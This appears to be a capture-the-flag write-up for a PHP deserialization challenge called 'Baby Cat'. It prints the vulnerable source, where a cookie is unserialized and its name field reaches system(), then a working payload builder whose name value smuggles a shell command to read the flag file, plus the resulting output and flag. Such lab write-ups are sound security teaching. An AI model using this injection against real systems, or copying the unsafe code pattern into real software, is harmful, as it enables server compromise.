# Baby Cat

Tag: `Deserialization`

[http://h4ck3r.quest:8601/](http://h4ck3r.quest:8601/)

## Writeup

The source is given:

```php
<?php
isset($_GET['source']) && die(!show_source(__FILE__));

class Cat
{
    public $name = '(guest cat)';
    function __construct($name)
    {
        $this->name = $name;
    }
    function __wakeup()
    {
        echo "<pre>";
        system("cowsay 'Welcome back, $this->name'");
        echo "</pre>";
    }
}

if (!isset($_COOKIE['cat_session'])) {
    $cat = new Cat("cat_" . rand(0, 0xffff));
    setcookie('cat_session', base64_encode(serialize($cat)));
} else {
    $cat = unserialize(base64_decode($_COOKIE['cat_session']));
}
?>
<p>Hello, <?= $cat->name ?>.</p>
<a href="/?source">source code</a>
```

I've tried to exploit `<?= $cat->name ?>` but it seems that it just print the variable, doesn't execute php code.

Hmm... `system()`? And there's no protection so basically is a trivial command injection.

You can view the flag name by `ls` then `cat` it. And that's a wrap for this challenge.

```php
<?php
class Cat
{
    public $name = '(guest cat)';
    function __construct($name)
    {
        $this->name = $name;
    }
    function __wakeup()
    {
        echo "<pre>";
        system("cowsay 'Welcome back, $this->name'");
        echo "</pre>";
    }
}
$cat = new Cat("Hacker';cat /flag_5fb2acebf1d0c558;'");
echo base64_encode(serialize($cat))
?>


<!-- ______________________
< Welcome back, Hacker >
 ----------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
FLAG{d3serializable_c4t}
Hello, Hacker';cat /flag_5fb2acebf1d0c558;'.
-->
```
